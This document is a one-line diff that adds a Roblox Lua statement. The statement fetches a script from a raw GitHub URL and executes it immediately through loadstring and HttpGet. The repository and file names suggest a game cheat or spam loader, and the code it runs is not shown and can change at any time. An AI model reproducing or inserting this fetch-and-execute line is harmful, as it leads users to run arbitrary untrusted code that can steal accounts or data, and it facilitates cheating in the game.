@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/event-anime-girl-card-collection-spam7-gkua8srno5ilgs.lua"))()
